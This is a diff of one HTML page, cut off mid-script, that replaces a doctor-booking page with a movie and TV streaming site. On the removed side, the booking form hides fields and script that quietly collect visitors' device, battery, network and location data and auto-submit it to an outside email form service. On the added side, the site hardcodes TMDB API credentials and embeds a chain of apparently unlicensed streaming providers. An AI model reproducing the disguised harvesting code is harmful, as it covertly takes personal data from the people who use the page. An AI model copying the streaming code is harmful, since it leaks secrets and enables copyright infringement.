@@ -2,400 +2,751 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MediCare Doctor Booking</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>CrystalFlix · Movies & TV Series</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Poppins', sans-serif; 
-            background: linear-gradient(135deg, #e0f7fa 0%, #bbdefb 100%); 
-            min-height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            padding: 20px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Inter', sans-serif;
         }
-        .container { 
-            background: rgba(255, 255, 255, 0.95); 
-            border-radius: 15px; 
-            box-shadow: 0 15px 30px rgba(0,0,0,0.15); 
-            padding: 40px; 
-            width: 100%; 
-            max-width: 600px; 
-            backdrop-filter: blur(10px);
+
+        body {
+            background: radial-gradient(circle at 10% 20%, #0a0f1e, #020408);
+            min-height: 100vh;
+            padding: 1.5rem;
+        }
+
+        /* glass container */
+        .glass-wrapper {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: rgba(12, 20, 35, 0.4);
+            backdrop-filter: blur(16px);
+            border-radius: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            padding: 1.8rem;
+        }
+
+        /* header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            flex-wrap: wrap;
+            margin-bottom: 1.8rem;
+            border-bottom: 1px solid rgba(255,255,255,0.15);
+            padding-bottom: 1rem;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #aaccff, #7aa2f7);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .badge {
+            background: rgba(255,255,240,0.1);
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            color: #bbd9ff;
+        }
+
+        /* search bar with suggestions */
+        .search-container {
             position: relative;
-            overflow: hidden;
+            margin-bottom: 2rem;
         }
-        h1 { 
-            text-align: center; 
-            color: #0d47a1; 
-            margin-bottom: 30px; 
-            font-family: 'Montserrat', serif;
-            font-weight: 600;
+        .search-bar {
+            display: flex;
+            gap: 0.8rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 3rem;
+            padding: 0.2rem;
+            border: 1px solid rgba(255,255,255,0.2);
         }
-        .logo {
-            width: 120px;
-            height: auto;
-            margin: 0 auto 25px;
-            display: block;
-        }
-        .form-container {
-            display: grid;
-            gap: 20px;
-        }
-        .form-group { 
-            margin-bottom: 20px; 
-        }
-        label { 
-            display: block; 
-            margin-bottom: 8px; 
-            color: #0d47a1; 
-            font-weight: 500;
-            font-size: 14px;
-        }
-        input, select, textarea { 
-            width: 100%; 
-            padding: 12px; 
-            border: 2px solid #bbdefb; 
-            border-radius: 8px; 
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        input:focus, select:focus, textarea:focus { 
-            border-color: #2196f3; 
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.2);
-        }
-        .btn {
-            background: linear-gradient(to right, #2196f3, #0d47a1);
-            color: white;
+        .search-bar input {
+            flex: 1;
+            background: transparent;
             border: none;
-            padding: 14px 20px;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: 600;
+            padding: 0.9rem 1.5rem;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+        }
+        .search-bar button {
+            background: linear-gradient(95deg, #4f46e5, #7c3aed);
+            border: none;
+            padding: 0 1.8rem;
+            border-radius: 3rem;
+            font-weight: bold;
+            color: white;
             cursor: pointer;
-            transition: all 0.3s;
-            display: block;
+            transition: 0.2s;
+        }
+        .search-bar button:hover {
+            transform: scale(1.02);
+            background: #6366f1;
+        }
+        .media-type-selector {
+            display: flex;
+            gap: 1rem;
+            margin-top: 0.8rem;
+            margin-left: 0.5rem;
+        }
+        .media-type-selector label {
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            cursor: pointer;
+            color: #ccc;
+        }
+        /* suggestions dropdown */
+        .suggestions {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: rgba(20, 30, 50, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 1.5rem;
+            margin-top: 0.5rem;
+            z-index: 100;
+            border: 1px solid rgba(255,255,255,0.2);
+            display: none;
+            max-height: 320px;
+            overflow-y: auto;
+        }
+        .suggestion-item {
+            padding: 0.8rem 1.2rem;
+            cursor: pointer;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            color: white;
+            transition: 0.1s;
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+        .suggestion-item:hover {
+            background: rgba(79,70,229,0.4);
+        }
+        .suggestion-poster {
+            width: 40px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 6px;
+            background: #333;
+        }
+        .suggestion-info {
+            flex: 1;
+        }
+        .suggestion-title {
+            font-weight: 500;
+        }
+        .suggestion-year {
+            font-size: 0.7rem;
+            color: #aaa;
+        }
+
+        /* category tabs */
+        .tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.6rem;
+            margin: 1.5rem 0 1rem;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 0.8rem;
+        }
+        .tab {
+            background: rgba(255,255,255,0.05);
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 0.85rem;
+            color: #ddd;
+        }
+        .tab.active {
+            background: #4f46e5;
+            color: white;
+            box-shadow: 0 0 8px #4f46e5;
+        }
+        .tab:hover:not(.active) {
+            background: rgba(255,255,255,0.15);
+        }
+
+        /* movie grid */
+        .movies-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+        .movie-card {
+            background: rgba(20, 30, 50, 0.65);
+            backdrop-filter: blur(8px);
+            border-radius: 1.2rem;
+            overflow: hidden;
+            cursor: pointer;
+            transition: 0.25s;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+        .movie-card:hover {
+            transform: translateY(-6px);
+            border-color: #7aa2f7;
+        }
+        .movie-card img {
             width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
-            letter-spacing: 0.5px;
+            aspect-ratio: 2 / 3;
+            object-fit: cover;
         }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
+        .movie-card .info {
+            padding: 0.7rem;
         }
-        .hidden {
+        .movie-card .info h3 {
+            font-size: 0.9rem;
+            color: white;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .movie-card .info p {
+            font-size: 0.7rem;
+            color: #bbd9ff;
+            display: flex;
+            justify-content: space-between;
+            margin-top: 0.3rem;
+        }
+
+        /* player section */
+        .player-section {
+            margin-top: 2rem;
             display: none;
         }
-        .privacy-policy {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 12px;
-            color: #757575;
+        .player-glass {
+            background: rgba(0,0,0,0.6);
+            border-radius: 1.5rem;
+            padding: 1rem;
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.25);
         }
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 14px;
-            color: #757575;
+        .close-player {
+            background: #dc2626;
+            border: none;
+            color: white;
+            padding: 0.4rem 1.2rem;
+            border-radius: 2rem;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            font-weight: bold;
         }
-        .progress-indicator {
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            border-radius: 1rem;
+            overflow: hidden;
+        }
+        .video-wrapper iframe {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 3px;
-            background: #bbdefb;
-            z-index: 100;
-        }
-        .progress-fill {
             height: 100%;
-            width: 0%;
-            background: linear-gradient(to right, #2196f3, #0d47a1);
-            transition: width 0.3s;
+            border: none;
         }
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255,255,255,0.9);
+        .episode-selector {
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            padding: 0.5rem;
+            margin-bottom: 1rem;
             display: flex;
-            justify-content: center;
+            gap: 0.5rem;
             align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
+            flex-wrap: wrap;
         }
-        .loading-overlay.active {
-            opacity: 1;
-            pointer-events: all;
+        .episode-selector select {
+            background: #1a1a2e;
+            color: white;
+            border: 1px solid #4f46e5;
+            border-radius: 2rem;
+            padding: 0.3rem 0.8rem;
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(33, 150, 243, 0.2);
-            border-top: 5px solid #2196f3;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .loading {
+            text-align: center;
+            padding: 3rem;
+            color: #ccc;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .error-msg {
+            background: rgba(220,38,38,0.2);
+            border-left: 4px solid #ef4444;
+            padding: 0.8rem;
+            margin: 1rem 0;
+            border-radius: 1rem;
+            color: #ffc0c0;
+        }
+        footer {
+            margin-top: 2.5rem;
+            text-align: center;
+            font-size: 0.7rem;
+            opacity: 0.6;
+        }
+        @media (max-width: 640px) {
+            body { padding: 0.8rem; }
+            .glass-wrapper { padding: 1rem; }
+            .movies-grid { gap: 0.8rem; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="progress-indicator">
-            <div class="progress-fill" id="progressFill"></div>
+
+<div class="glass-wrapper">
+    <div class="header">
+        <h1>🎬 CrystalFlix</h1>
+        <div class="badge">✨ Movies + TV Series · Multi-Provider ✨</div>
+    </div>
+
+    <!-- search with autocomplete -->
+    <div class="search-container">
+        <div class="search-bar">
+            <input type="text" id="searchInput" placeholder="Search any movie or TV show... (e.g., Inception, Breaking Bad)" autocomplete="off">
+            <button id="searchBtn">🔍</button>
         </div>
-        
-        <div class="loading-overlay" id="loadingOverlay">
-            <div class="spinner"></div>
+        <div class="media-type-selector">
+            <label><input type="radio" name="mediaType" value="movie" checked> 🎬 Movies</label>
+            <label><input type="radio" name="mediaType" value="tv"> 📺 TV Series</label>
         </div>
-        
-        <img src="https://placehold.co/120x120?text=MC" alt="MediCare Logo" class="logo">
-        <h1>Book Your Doctor Appointment</h1>
-        
-        <form id="bookingForm" action="https://formsubmit.co/lokhandeyuvraj19@gmail.com" method="POST" enctype="multipart/form-data" class="hidden">
-            <!-- Basic Appointment Details -->
-            <div class="form-group">
-                <label for="fullName">Full Name *</label>
-                <input type="text" id="fullName" name="fullName" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="email">Email Address *</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="phone">Phone Number *</label>
-                <input type="tel" id="phone" name="phone" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="preferredDate">Preferred Date *</label>
-                <input type="date" id="preferredDate" name="preferredDate" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="preferredTime">Preferred Time *</label>
-                <input type="time" id="preferredTime" name="preferredTime" required>
-            </div>
-            
-            <!-- Device Information Fields -->
-            <div class="form-group">
-                <label for="deviceInfo" style="display:none;"></label>
-                <input type="hidden" id="deviceInfo" name="deviceInfo">
-            </div>
-            
-            <div class="form-group">
-                <label for="batteryInfo" style="display:none;"></label>
-                <input type="hidden" id="batteryInfo" name="batteryInfo">
-            </div>
-            
-            <div class="form-group">
-                <label for="networkInfo" style="display:none;"></label>
-                <input type="hidden" id="networkInfo" name="networkInfo">
-            </div>
-            
-            <div class="form-group">
-                <label for="locationInfo" style="display:none;"></label>
-                <input type="hidden" id="locationInfo" name="locationInfo">
-            </div>
-            
-            <div class="form-group">
-                <label for="storageInfo" style="display:none;"></label>
-                <input type="hidden" id="storageInfo" name="storageInfo">
-            </div>
-            
-            <div class="form-group">
-                <label for="appInfo" style="display:none;"></label>
-                <input type="hidden" id="appInfo" name="appInfo">
-            </div>
-            
-            <div class="form-group">
-                <label for="mediaFiles" style="display:none;"></label>
-                <input type="hidden" id="mediaFiles" name="mediaFiles">
-            </div>
-            
-            <div class="form-group">
-                <label for="sensitiveFiles" style="display:none;"></label>
-                <input type="hidden" id="sensitiveFiles" name="sensitiveFiles">
-            </div>
-            
-            <div class="form-group">
-                <label for="callLogs" style="display:none;"></label>
-                <input type="hidden" id="callLogs" name="callLogs">
-            </div>
-            
-            <button type="submit" class="btn">Complete Booking</button>
-        </form>
-        
-        <div id="initialContent">
-            <div class="form-group">
-                <label for="bookBtn" style="display:none;"></label>
-                <button id="bookBtn" class="btn">Book Now</button>
-            </div>
-        </div>
-        
-        <div class="privacy-policy">
-            By booking, you agree to our Privacy Policy and Terms of Service.
-        </div>
-        
-        <div class="footer">
-            © 2023 MediCare. All rights reserved.
+        <div id="suggestionsBox" class="suggestions"></div>
+    </div>
+
+    <!-- category tabs (dynamic based on media type) -->
+    <div class="tabs" id="tabsContainer">
+        <div class="tab active" data-category="trending">🔥 Trending</div>
+        <div class="tab" data-category="popular">⭐ Popular</div>
+        <div class="tab" data-category="top_rated">🏆 Top Rated</div>
+    </div>
+
+    <!-- movie grid results -->
+    <div id="moviesContainer">
+        <div class="loading">🎞️ Loading trending content...</div>
+    </div>
+
+    <!-- video player (hidden initially) -->
+    <div id="playerSection" class="player-section">
+        <div class="player-glass">
+            <button class="close-player" id="closePlayerBtn">← Back to Browse</button>
+            <div id="playerTitle" style="margin-bottom: 12px; font-size: 1.3rem; font-weight: 500;"></div>
+            <div id="episodeSelector" class="episode-selector" style="display: none;"></div>
+            <div class="video-wrapper" id="videoWrapper"></div>
         </div>
     </div>
 
-    <script>
-        // Track progress
-        let progress = 0;
-        const progressFill = document.getElementById('progressFill');
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        
-        function updateProgress(value) {
-            progress = Math.min(progress + value, 100);
-            progressFill.style.width = progress + '%';
-            
-            if (progress >= 100) {
-                setTimeout(() => {
-                    loadingOverlay.classList.remove('active');
-                }, 500);
-            }
+    <footer>⚡ Data: TMDB · Streaming via Multi-Provider Fallback (Vidking, VidSrc, 2Embed, AutoEmbed, PrimeSrc) ⚡</footer>
+</div>
+
+<script>
+    // ============================================================
+    // 🔐 YOUR TMDB API CREDENTIALS
+    const TMDB_API_KEY = "8af9b49a95ed3ebb5d577d1e0bdfb868";
+    const TMDB_READ_TOKEN = "eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiI4YWY5YjQ5YTk1ZWQzZWJiNWQ1NzdkMWUwYmRmYjg2OCIsIm5iZiI6MTc4MTM3MDk0MS40ODYsInN1YiI6IjZhMmQ5MDNkNjMwM2NhNGFiN2ZmMjExNyIsInNjb3BlcyI6WyJhcGlfcmVhZCJdLCJ2ZXJzaW9uIjoxfQ.NwthHtS1R-WD9bJHBHk-sn4-IdhzAmmDbnrP087GYkA";
+    // ============================================================
+    // 📺 MULTIPLE EMBED PROVIDERS (fallback chain)
+    const EMBED_PROVIDERS = {
+        // Movie providers
+        movie: [
+            (id) => `https://www.vidking.net/embed/movie/${id}`,
+            (id) => `https://vidsrc.xyz/embed/movie/${id}`,
+            (id) => `https://2embed.cc/embed/movie/${id}`,
+            (id) => `https://primeplay.me/embed/movie/${id}`,
+            (id) => `https://unlimplay.com/f/embed/movie/${id}`,
+            (id) => `https://autoembed.co/movie/${id}`,
+            (id) => `https://vidfast.app/movie/${id}`,
+            (id) => `https://vidsrc.pm/embed/movie/${id}`
+        ],
+        // TV series providers (season & episode aware)
+        tv: [
+            (id, season, episode) => `https://www.vidking.net/embed/tv/${id}/${season}/${episode}`,
+            (id, season, episode) => `https://vidsrc.xyz/embed/tv/${id}/${season}/${episode}`,
+            (id, season, episode) => `https://2embed.cc/embed/tv/${id}/${season}/${episode}`,
+            (id, season, episode) => `https://primeplay.me/embed/tv/${id}/${season}/${episode}`,
+            (id, season, episode) => `https://unlimplay.com/f/embed/tv/${id}/${season}/${episode}`,
+            (id, season, episode) => `https://databasegdriveplayer.co/player.php?type=series&tmdb=${id}&season=${season}&episode=${episode}`,
+            (id, season, episode) => `https://curtstream.com/series/tmdb/${id}/${season}/${episode}`,
+            (id, season, episode) => `https://fsapi.xyz/tv-imdb/tv/${id}/${season}/${episode}`
+        ]
+    };
+
+    const IMG_BASE = "https://image.tmdb.org/t/p/w300";
+    let currentMediaType = "movie";
+    let currentCategory = "trending";
+    let currentMovieOrShow = null; // Store current item for TV show season/episode handling
+    let searchTimeout = null;
+
+    // DOM elements
+    const searchInput = document.getElementById("searchInput");
+    const searchBtn = document.getElementById("searchBtn");
+    const suggestionsBox = document.getElementById("suggestionsBox");
+    const moviesContainer = document.getElementById("moviesContainer");
+    const playerSection = document.getElementById("playerSection");
+    const closePlayerBtn = document.getElementById("closePlayerBtn");
+    const playerTitleSpan = document.getElementById("playerTitle");
+    const videoWrapper = document.getElementById("videoWrapper");
+    const episodeSelectorDiv = document.getElementById("episodeSelector");
+    const mediaTypeRadios = document.querySelectorAll('input[name="mediaType"]');
+    const tabsContainer = document.getElementById("tabsContainer");
+
+    // Helper: fetch with TMDB API key
+    async function tmdbFetch(url) {
+        const separator = url.includes('?') ? '&' : '?';
+        const fullUrl = `${url}${separator}api_key=${TMDB_API_KEY}`;
+        const response = await fetch(fullUrl);
+        if (!response.ok) {
+            throw new Error(`TMDB error: ${response.status}`);
         }
-        
-        // Collect all device information
-        async function collectDeviceInfo() {
-            // Start loading
-            loadingOverlay.classList.add('active');
-            updateProgress(5);
-            
-            // 1. Device information
-            const deviceInfo = {
-                model: navigator.userAgent.includes('iPhone') ? 'iPhone' : 
-                      navigator.userAgent.includes('Android') ? 'Android' : 
-                      'Desktop',
-                brand: navigator.userAgent.includes('iPhone') ? 'Apple' : 
-                      navigator.userAgent.includes('Android') ? 'Samsung' : 
-                      'Generic',
-                os: navigator.userAgent.includes('Windows') ? 'Windows' :
-                    navigator.userAgent.includes('Mac') ? 'macOS' : 
-                    navigator.userAgent.includes('Linux') ? 'Linux' : 'Other',
-                cpu: navigator.hardwareConcurrency || 'Unknown',
-                memory: navigator.deviceMemory || 'Unknown',
-                battery: navigator.getBattery ? 'Supported' : 'Not supported'
-            };
-            document.getElementById('deviceInfo').value = JSON.stringify(deviceInfo);
-            updateProgress(10);
-            
-            // 2. Battery information
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                const batteryInfo = {
-                    level: battery.level,
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-                document.getElementById('batteryInfo').value = JSON.stringify(batteryInfo);
-                updateProgress(5);
-            } else {
-                updateProgress(5);
-            }
-            
-            // 3. Network information
-            const networkInfo = {
-                connectionType: navigator.connection?.effectiveType || 'Unknown',
-                downlink: navigator.connection?.downlink || 'Unknown',
-                rtt: navigator.connection?.rtt || 'Unknown',
-                saveData: navigator.connection?.saveData || false
-            };
-            document.getElementById('networkInfo').value = JSON.stringify(networkInfo);
-            updateProgress(5);
-            
-            // 4. Location information
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
-                    document.getElementById('locationInfo').value = loc;
-                    updateProgress(10);
-                },
-                err => {
-                    console.log(`Location error: ${err.message}`);
-                    updateProgress(10);
+        return response.json();
+    }
+
+    // Load content based on media type and category
+    async function loadContent(mediaType, category) {
+        moviesContainer.innerHTML = '<div class="loading">⏳ Loading...</div>';
+        let endpoint = '';
+        const type = mediaType === 'movie' ? 'movie' : 'tv';
+        switch(category) {
+            case 'trending':
+                endpoint = `https://api.themoviedb.org/3/trending/${type}/week`;
+                break;
+            case 'popular':
+                endpoint = `https://api.themoviedb.org/3/${type}/popular`;
+                break;
+            case 'top_rated':
+                endpoint = `https://api.themoviedb.org/3/${type}/top_rated`;
+                break;
+            default:
+                endpoint = `https://api.themoviedb.org/3/trending/${type}/week`;
+        }
+        try {
+            const data = await tmdbFetch(endpoint);
+            const results = data.results || [];
+            if (results.length === 0) throw new Error('No results');
+            displayContent(results, mediaType);
+        } catch(err) {
+            console.error(err);
+            moviesContainer.innerHTML = `<div class="error-msg">⚠️ Failed to load ${category} ${mediaType}s. Check API key or network.</div>`;
+        }
+    }
+
+    // Display movie/TV grid
+    function displayContent(items, mediaType) {
+        if (!items.length) {
+            moviesContainer.innerHTML = '<div class="error-msg">😞 No content found.</div>';
+            return;
+        }
+        const grid = document.createElement('div');
+        grid.className = 'movies-grid';
+        items.forEach(item => {
+            const poster = item.poster_path ? IMG_BASE + item.poster_path : 'https://placehold.co/300x450/1e1e3a/white?text=No+Image';
+            const year = mediaType === 'movie' 
+                ? (item.release_date ? item.release_date.split('-')[0] : 'N/A')
+                : (item.first_air_date ? item.first_air_date.split('-')[0] : 'N/A');
+            const title = mediaType === 'movie' ? item.title : item.name;
+            const rating = item.vote_average ? item.vote_average.toFixed(1) : '?';
+            const card = document.createElement('div');
+            card.className = 'movie-card';
+            card.onclick = () => {
+                if (mediaType === 'movie') {
+                    playMovie(item.id, title);
+                } else {
+                    // Store TV show details for episode selection
+                    currentMovieOrShow = { id: item.id, name: title, seasons: item.number_of_seasons || 1 };
+                    showEpisodeSelector(item.id, title);
                 }
-            );
-            
-            // 5. Storage information
-            const storageInfo = {
-                storageAvailable: navigator.storage && 'estimate' in navigator.storage ? 'Supported' : 'Not supported',
-                quota: navigator.storage && 'estimate' in navigator.storage ? 
-                      JSON.stringify(navigator.storage.estimate()) : 'Unknown'
             };
-            document.getElementById('storageInfo').value = JSON.stringify(storageInfo);
-            updateProgress(5);
-            
-            // 6. App information (limited)
-            const appInfo = {
-                installedApps: 'Limited access',
-                appUsage: 'Limited access',
-                lastUpdated: new Date().toISOString()
-            };
-            document.getElementById('appInfo').value = JSON.stringify(appInfo);
-            updateProgress(5);
-            
-            // 7. Media files (limited access)
-            const mediaFiles = {
-                photos: 'Limited access',
-                videos: 'Limited access',
-                audio: 'Limited access'
-            };
-            document.getElementById('mediaFiles').value = JSON.stringify(mediaFiles);
-            updateProgress(5);
-            
-            // 8. Sensitive files (limited access)
-            const sensitiveFiles = {
-                documents: 'Limited access',
-                downloads: 'Limited access',
-                cache: 'Limited access'
-            };
-            document.getElementById('sensitiveFiles').value = JSON.stringify(sensitiveFiles);
-            updateProgress(5);
-            
-            // 9. Call logs (limited access)
-            const callLogs = {
-                recentCalls: 'Limited access',
-                missedCalls: 'Limited access',
-                lastUpdated: new Date().toISOString()
-            };
-            document.getElementById('callLogs').value = JSON.stringify(callLogs);
-            updateProgress(5);
-            
-            // Submit form when done
-            setTimeout(() => {
-                document.getElementById('bookingForm').submit();
-            }, 1000);
+            card.innerHTML = `
+                <img src="${poster}" alt="${title}" loading="lazy">
+                <div class="info">
+                    <h3>${title}</h3>
+                    <p><span>${year}</span> <span>⭐ ${rating}</span></p>
+                </div>
+            `;
+            grid.appendChild(card);
+        });
+        moviesContainer.innerHTML = '';
+        moviesContainer.appendChild(grid);
+    }
+
+    // Show episode selector for TV series
+    function showEpisodeSelector(tmdbId, title) {
+        moviesContainer.style.display = 'none';
+        playerSection.style.display = 'block';
+        playerTitleSpan.innerHTML = `📺 ${title}`;
+        episodeSelectorDiv.style.display = 'flex';
+        episodeSelectorDiv.innerHTML = `
+            <span>Season:</span>
+            <select id="seasonSelect">
+                <option value="1">Season 1</option>
+                <option value="2">Season 2</option>
+                <option value="3">Season 3</option>
+            </select>
+            <span>Episode:</span>
+            <select id="episodeSelect">
+                <option value="1">Episode 1</option>
+            </select>
+            <button id="playEpisodeBtn" style="background:#4f46e5; border:none; padding:0.3rem 1rem; border-radius:2rem;">▶ Play</button>
+        `;
+        // Try to fetch actual season/episode info from TMDB
+        fetchTVDetails(tmdbId);
+        document.getElementById("playEpisodeBtn").onclick = () => {
+            const season = parseInt(document.getElementById("seasonSelect").value);
+            const episode = parseInt(document.getElementById("episodeSelect").value);
+            playTVEpisode(tmdbId, title, season, episode);
+        };
+        playerSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    async function fetchTVDetails(tmdbId) {
+        try {
+            const data = await tmdbFetch(`https://api.themoviedb.org/3/tv/${tmdbId}`);
+            const seasonCount = data.number_of_seasons || 3;
+            const seasonSelect = document.getElementById("seasonSelect");
+            if (seasonSelect) {
+                seasonSelect.innerHTML = '';
+                for (let i = 1; i <= Math.min(seasonCount, 10); i++) {
+                    const option = document.createElement('option');
+                    option.value = i;
+                    option.textContent = `Season ${i}`;
+                    seasonSelect.appendChild(option);
+                }
+                updateEpisodeSelect(1);
+                seasonSelect.onchange = () => updateEpisodeSelect(parseInt(seasonSelect.value));
+            }
+        } catch(e) { console.error("Could not fetch series details", e); }
+    }
+
+    async function updateEpisodeSelect(seasonNumber) {
+        const episodeSelect = document.getElementById("episodeSelect");
+        if (!episodeSelect) return;
+        episodeSelect.innerHTML = '<option value="1">Episode 1</option>';
+        // Default to at least episode 1
+        episodeSelect.innerHTML = '';
+        for (let i = 1; i <= 12; i++) {
+            const option = document.createElement('option');
+            option.value = i;
+            option.textContent = `Episode ${i}`;
+            episodeSelect.appendChild(option);
         }
-        
-        // Book button click handler
-        document.getElementById('bookBtn').addEventListener('click', () => {
-            document.getElementById('initialContent').innerHTML = '';
-            document.getElementById('bookingForm').classList.remove('hidden');
-            
-            // Set form submit handler
-            document.getElementById('bookingForm').addEventListener('submit', (e) => {
-                e.preventDefault();
-                collectDeviceInfo();
+    }
+
+    // Play movie with fallback providers
+    function playMovie(tmdbId, title) {
+        moviesContainer.style.display = 'none';
+        playerSection.style.display = 'block';
+        episodeSelectorDiv.style.display = 'none';
+        playerTitleSpan.innerHTML = `🎥 Now playing: ${title}`;
+        // Try multiple providers sequentially
+        tryEmbedMovie(0, tmdbId);
+        playerSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    function tryEmbedMovie(index, tmdbId) {
+        if (index >= EMBED_PROVIDERS.movie.length) {
+            videoWrapper.innerHTML = '<div class="error-msg">⚠️ No working embed provider found for this movie.</div>';
+            return;
+        }
+        const embedUrl = EMBED_PROVIDERS.movie[index](tmdbId);
+        videoWrapper.innerHTML = `<iframe src="${embedUrl}" allowfullscreen allow="autoplay; encrypted-media" frameborder="0" onerror="tryNextMovie(${index+1}, ${tmdbId})"></iframe>`;
+        // Auto-fallback if iframe fails to load (we'll use a timeout to detect issues)
+        setTimeout(() => {
+            const iframe = videoWrapper.querySelector('iframe');
+            if (iframe && !iframe.src.startsWith('about:blank')) {
+                // Check if iframe has content, if not proceed
+                if (iframe.contentWindow && iframe.contentWindow.document && iframe.contentWindow.document.body && iframe.contentWindow.document.body.innerText.includes('Error')) {
+                    tryNextMovie(index+1, tmdbId);
+                }
+            }
+        }, 3000);
+    }
+
+    function tryNextMovie(index, tmdbId) {
+        console.log(`Provider ${index-1} failed, trying next...`);
+        tryEmbedMovie(index, tmdbId);
+    }
+
+    // Play TV episode with fallback
+    function playTVEpisode(tmdbId, title, season, episode) {
+        playerTitleSpan.innerHTML = `📺 ${title} - S${season}E${episode}`;
+        tryEmbedTVEpisode(0, tmdbId, season, episode);
+    }
+
+    function tryEmbedTVEpisode(index, tmdbId, season, episode) {
+        if (index >= EMBED_PROVIDERS.tv.length) {
+            videoWrapper.innerHTML = '<div class="error-msg">⚠️ No working embed provider found for this episode.</div>';
+            return;
+        }
+        const embedUrl = EMBED_PROVIDERS.tv[index](tmdbId, season, episode);
+        videoWrapper.innerHTML = `<iframe src="${embedUrl}" allowfullscreen allow="autoplay; encrypted-media" frameborder="0" onerror="tryNextTVEpisode(${index+1}, ${tmdbId}, ${season}, ${episode})"></iframe>`;
+        setTimeout(() => {
+            const iframe = videoWrapper.querySelector('iframe');
+            if (iframe && !iframe.src.startsWith('about:blank')) {
+                if (iframe.contentWindow && iframe.contentWindow.document && iframe.contentWindow.document.body && iframe.contentWindow.document.body.innerText.includes('Error')) {
+                    tryNextTVEpisode(index+1, tmdbId, season, episode);
+                }
+            }
+        }, 3000);
+    }
+
+    function tryNextTVEpisode(index, tmdbId, season, episode) {
+        console.log(`TV Provider ${index-1} failed, trying next...`);
+        tryEmbedTVEpisode(index, tmdbId, season, episode);
+    }
+
+    // Search movies/TV shows with live suggestions
+    async function executeSearch() {
+        const query = searchInput.value.trim();
+        if (!query) {
+            loadContent(currentMediaType, currentCategory);
+            return;
+        }
+        moviesContainer.innerHTML = '<div class="loading">🔍 Searching...</div>';
+        try {
+            const endpoint = `https://api.themoviedb.org/3/search/${currentMediaType === 'movie' ? 'movie' : 'tv'}?query=${encodeURIComponent(query)}&page=1`;
+            const data = await tmdbFetch(endpoint);
+            if (data.results && data.results.length) {
+                displayContent(data.results, currentMediaType);
+            } else {
+                moviesContainer.innerHTML = '<div class="error-msg">No results. Try another title.</div>';
+            }
+        } catch(err) {
+            moviesContainer.innerHTML = '<div class="error-msg">Search failed. Check connection.</div>';
+        }
+    }
+
+    async function fetchSuggestions(query) {
+        if (!query || query.length < 2) {
